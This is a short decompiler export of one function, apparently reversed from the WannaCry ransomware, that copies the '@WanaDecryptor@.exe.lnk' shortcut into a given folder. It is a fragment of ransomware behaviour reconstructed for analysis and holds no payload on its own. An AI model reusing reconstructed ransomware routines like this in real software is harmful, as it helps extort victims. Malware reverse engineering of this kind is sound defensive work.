// --- Metadata ---
// Function Name: CopyDecLnkFileToPath_10003240
// Address: 0x10003240
// Exported At: 20250522_175813
// Signature: unknown_signature
// ---------------
BOOL __stdcall CopyDecLnkFileToPath_10003240(wchar_t *Format)
{
  wchar_t Buffer[360]; // [esp+0h] [ebp-2D0h] BYREF

  swprintf(Buffer, (const size_t)L"%s\\%s", Format, L"@WanaDecryptor@.exe.lnk");
  return CopyFileW(L"@WanaDecryptor@.exe.lnk", Buffer, 1);
}
